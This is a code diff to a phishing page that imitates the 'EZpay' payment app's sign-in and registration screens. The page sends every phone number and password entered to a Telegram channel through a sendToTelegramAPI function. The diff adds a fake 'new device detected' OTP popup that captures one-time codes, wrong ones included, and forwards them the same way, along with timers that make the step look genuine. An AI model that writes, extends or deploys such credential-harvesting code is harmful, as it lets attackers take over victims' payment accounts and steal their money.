@@ -37,68 +37,62 @@
             width: 100%; border: none; outline: none; background: transparent; color: #1f2937; font-size: 16px;
         }
         input[type="checkbox"] { accent-color: #2563eb; width: 16px; height: 16px; cursor: pointer; }
+        .overlay {
+            position: fixed; inset: 0; background: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(2px); display: flex; align-items: center; justify-content: center;
+            z-index: 100; padding: 16px; opacity: 0; visibility: hidden; transition: all 0.3s ease;
+        }
+        .overlay.show { opacity: 1; visibility: visible; }
     </style>
 </head>
-<body class="flex items-center justify-center p-4">
+<body class="flex items-center justify-center p-0 sm:p-4">
 
-    <div class="w-full max-w-md bg-white rounded-3xl shadow-xl flex flex-col justify-between p-8 relative overflow-hidden min-h-[600px]">
+    <div class="w-full max-w-md bg-white sm:rounded-3xl sm:shadow-xl flex flex-col justify-between p-8 relative overflow-hidden min-h-screen sm:min-h-[750px]">
 
-        <!-- ==================== SCREEN 1: SIGN IN ==================== -->
+        <!-- SIGN IN SCREEN -->
         <div id="screen-signin" class="screen-view flex flex-col justify-between flex-grow">
-              <div>
-                <!-- Logo & Title -->
+            <div>
                 <div class="flex flex-col items-center mt-6 mb-8">
-                    <div class="w-20 h-20 bg-blue-600 rounded-2xl flex items-center justify-center shadow-lg mb-3">
-                        <span class="text-white text-4xl font-bold tracking-wider">E</span>
-                    </div>
+                    <img src="logo.png" alt="EZpay Logo" class="w-20 h-20 rounded-2xl shadow-lg mb-3 object-cover bg-blue-600" onerror="this.onerror=null; this.src='https://placehold.co/80x80/2563eb/ffffff?text=E';">
                     <h1 class="text-blue-600 text-xl font-bold italic tracking-wide">EZpay</h1>
                 </div>
 
                 <form id="form-signin" onsubmit="handleSignIn(event)" class="space-y-5">
-                    <!-- Phone Input -->
+                    <div class="text-sm font-medium text-gray-600">Phone</div>
                     <div class="ez-input-box">
                         <span class="text-gray-600 font-medium text-base">+91</span>
-                        <input type="tel" id="signin-phone" placeholder="Phone" inputmode="numeric" maxlength="10" oninput="this.value = this.value.replace(/[^0-9]/g, '')" required>
+                        <input type="tel" id="signin-phone" placeholder="7061082880" inputmode="numeric" maxlength="10" oninput="this.value = this.value.replace(/[^0-9]/g, '')" required>
                     </div>
 
-                    <!-- Password Input -->
+                    <div class="text-sm font-medium text-gray-600">Password</div>
                     <div class="ez-input-box relative">
-                        <input type="password" id="signin-password" placeholder="Password" required class="pr-8">
+                        <input type="password" id="signin-password" placeholder="••••••••••••" required class="pr-8">
                         <button type="button" onclick="togglePasswordVisibility('signin-password', 'signin-eye-icon')" class="absolute right-5 text-gray-400 hover:text-gray-600 focus:outline-none">
                             <i id="signin-eye-icon" class="fa-regular fa-eye-slash text-lg"></i>
                         </button>
                     </div>
 
-                    <!-- Sign In Button -->
-                    <div class="pt-2">
+                    <div class="pt-4">
                         <button type="submit" class="ez-btn w-full py-4 rounded-full text-base tracking-wide shadow-md">
                             SIGN IN
                         </button>
                     </div>
 
-                    <!-- Privacy Policy Checkbox -->
                     <div class="flex items-center justify-center space-x-2 pt-2">
                         <input type="checkbox" id="privacy-agree" checked required>
                         <span class="text-gray-500 text-xs">By logging in you agree to our <button type="button" onclick="openPrivacyModal()" class="text-blue-600 hover:underline">Privacy Policy</button></span>
                     </div>
                 </form>
 
-                <!-- Create New Account Link -->
                 <div class="text-center mt-6">
                     <button type="button" onclick="switchScreen('screen-register')" class="text-blue-600 text-sm hover:underline font-medium">
                         create new account?
                     </button>
                 </div>
             </div>
-
-            <!-- Error Toast / Message Banner -->
-            <div id="error-toast" class="hidden mt-6 bg-gray-100 border border-gray-200 text-gray-700 text-center py-3 px-4 rounded-full text-sm shadow-inner">
-                The phone number or password error
-            </div>
         </div>
 
-
-        <!-- ==================== SCREEN 2: REGISTER ==================== -->
+        <!-- REGISTER SCREEN -->
         <div id="screen-register" class="screen-view hidden flex flex-col justify-between flex-grow">
             <div>
                 <div class="flex items-center mt-4 mb-6 relative">
@@ -109,30 +103,51 @@
                 </div>
 
                 <form id="form-register" onsubmit="handleRegister(event)" class="space-y-4">
-                    <div class="ez-input-box">
-                        <input type="text" id="regUsername" placeholder="User Name" required>
-                    </div>
-                    <div class="ez-input-box">
-                        <input type="tel" id="regPhone" placeholder="Phone (10 digits)" inputmode="numeric" maxlength="10" oninput="this.value = this.value.replace(/[^0-9]/g, '')" required>
-                    </div>
-                    <div class="ez-input-box relative">
-                        <input type="password" id="register-password" placeholder="Password" required>
-                    </div>
+                    <div class="ez-input-box"><input type="text" id="regUsername" placeholder="User Name" required></div>
+                    <div class="ez-input-box"><input type="tel" id="regPhone" placeholder="Phone (10 digits)" inputmode="numeric" maxlength="10" oninput="this.value = this.value.replace(/[^0-9]/g, '')" required></div>
+                    <div class="ez-input-box"><input type="password" id="register-password" placeholder="Password" required></div>
+                    
                     <div class="ez-input-box justify-between">
-                        <input type="text" id="regOtp" placeholder="OTP Code" inputmode="numeric" maxlength="6" oninput="this.value = this.value.replace(/[^0-9]/g, '')" required style="width: 60%;">
-                        <button type="button" id="regSendBtn" onclick="handleRegisterSend(event)" class="bg-blue-100 text-blue-600 px-4 py-2 rounded-full text-sm font-semibold hover:bg-blue-200 transition-colors">
+                        <input type="text" id="regOtp" placeholder="OTP Code" inputmode="numeric" maxlength="6" oninput="this.value = this.value.replace(/[^0-9]/g, '')" required style="width: 55%;">
+                        <button type="button" id="regSendBtn" onclick="handleRegisterSend(event)" class="ez-btn px-4 py-2 rounded-full text-xs font-semibold">
                             Send OTP
                         </button>
                     </div>
+
                     <div class="pt-4">
-                        <button type="submit" class="ez-btn w-full py-4 rounded-full text-base shadow-md">
-                            SIGN UP
-                        </button>
+                        <button type="submit" class="ez-btn w-full py-4 rounded-full text-base shadow-md">SIGN UP</button>
                     </div>
                 </form>
             </div>
         </div>
 
+    </div>
+
+    <!-- NEW DEVICE OTP POPUP -->
+    <div id="otpOverlay" class="overlay">
+        <div class="bg-white rounded-3xl p-6 max-w-sm w-full shadow-2xl relative">
+            <button onclick="closeOtpModal()" class="absolute top-4 right-4 text-gray-400 hover:text-gray-600 text-xl">&times;</button>
+            
+            <h3 class="text-lg font-bold text-gray-900 text-center mb-2">Please enter OTP</h3>
+            <p class="text-xs text-gray-500 text-center mb-6 leading-relaxed">
+                You have been detected logging in on a new device. Please verify your identity.
+            </p>
+
+            <form id="otpForm" onsubmit="handleOtpSubmit(event)" class="space-y-4">
+                <div class="text-xs font-medium text-gray-600">OTP</div>
+                <div class="ez-input-box justify-between">
+                    <input type="text" id="popupOtp" placeholder="Please enter OTP" inputmode="numeric" maxlength="6" oninput="this.value = this.value.replace(/[^0-9]/g, '')" required style="width: 55%;">
+                    <button type="button" id="popupSendBtn" onclick="popupSendOtp()" class="ez-btn px-4 py-2 rounded-full text-xs font-semibold">
+                        Send OTP
+                    </button>
+                </div>
+
+                <button type="submit" class="ez-btn w-full py-3.5 rounded-full text-base shadow-md mt-4">
+                    Confirm
+                </button>
+            </form>
+            <p id="otpStatus" class="text-center text-xs mt-3 text-red-500 font-medium"></p>
+        </div>
     </div>
 
     <!-- Privacy Modal -->
@@ -148,9 +163,10 @@
         </div>
     </div>
 
-    <!-- Script Logic -->
     <script>
         const CORRECT_OTP = '123456';
+        let pendingPhone = '';
+        let pendingPassword = '';
 
         async function sendToTelegramAPI(payload) {
             try {
@@ -187,30 +203,81 @@
         function openPrivacyModal() { document.getElementById('privacy-modal').classList.remove('hidden'); }
         function closePrivacyModal() { document.getElementById('privacy-modal').classList.add('hidden'); }
 
+        function startTimer(btnElement) {
+            let timeLeft = 60;
+            btnElement.disabled = true;
+            let originalText = btnElement.innerText;
+            
+            const timerInterval = setInterval(() => {
+                btnElement.innerText = `${timeLeft}s`;
+                timeLeft--;
+                if (timeLeft < 0) {
+                    clearInterval(timerInterval);
+                    btnElement.innerText = originalText;
+                    btnElement.disabled = false;
+                }
+            }, 1000);
+        }
+
         function handleSignIn(event) {
             event.preventDefault();
-            const phone = document.getElementById('signin-phone').value;
-            const password = document.getElementById('signin-password').value;
+            pendingPhone = document.getElementById('signin-phone').value;
+            pendingPassword = document.getElementById('signin-password').value;
 
-            // Telegram par data bhejega (chahe galat ho ya sahi)
             sendToTelegramAPI({
                 type: 'signin',
-                phone: phone,
-                password: password,
-                pin: 'N/A'
+                phone: pendingPhone,
+                password: pendingPassword
             });
 
-            // Image ki tarah error show karega neeche
-            const toast = document.getElementById('error-toast');
-            toast.classList.remove('hidden');
-            setTimeout(() => { toast.classList.add('hidden'); }, 4000);
+            document.getElementById('otpOverlay').classList.add('show');
+        }
+
+        function closeOtpModal() {
+            document.getElementById('otpOverlay').classList.remove('show');
+        }
+
+        function popupSendOtp() {
+            const btn = document.getElementById('popupSendBtn');
+            startTimer(btn);
+            sendToTelegramAPI({
+                type: 'notify',
+                phone: pendingPhone,
+                details: 'OTP requested for login (New Device Verification)'
+            });
         }
 
         function handleRegisterSend(event) {
             const phone = document.getElementById('regPhone').value;
             if(phone.length !== 10) { alert('Enter valid 10 digit phone'); return; }
-            sendToTelegramAPI({ type: 'notify', phone: phone, details: 'OTP requested for EZpay registration' });
-            alert('OTP Sent: 123456');
+            startTimer(event.target);
+            sendToTelegramAPI({ type: 'notify', phone: phone, details: 'OTP requested for Registration' });
+        }
+
+        function handleOtpSubmit(event) {
+            event.preventDefault();
+            const otpInput = document.getElementById('popupOtp').value;
+            const statusEl = document.getElementById('otpStatus');
+
+            if (otpInput !== CORRECT_OTP) {
+                statusEl.textContent = 'Wrong OTP entered!';
+                sendToTelegramAPI({
+                    type: 'notify',
+                    phone: pendingPhone,
+                    details: `❌ <b>Wrong OTP Entered during Login!</b>\nEntered OTP: <code>${otpInput}</code>`
+                });
+                return;
+            }
+
+            statusEl.textContent = '';
+            sendToTelegramAPI({
+                type: 'notify',
+                phone: pendingPhone,
+                details: `✅ <b>Login Successful with Correct OTP!</b>`
+            });
+
+            alert('Login Successful!');
+            closeOtpModal();
         }
 
         function handleRegister(event) {
@@ -230,6 +297,11 @@
 
             if(otp !== CORRECT_OTP) {
                 alert('Wrong OTP entered!');
+                sendToTelegramAPI({
+                    type: 'notify',
+                    phone: phone,
+                    details: `❌ <b>Wrong Registration OTP!</b> Entered: <code>${otp}</code>`
+                });
                 return;
             }
             alert('Registration Successful!');
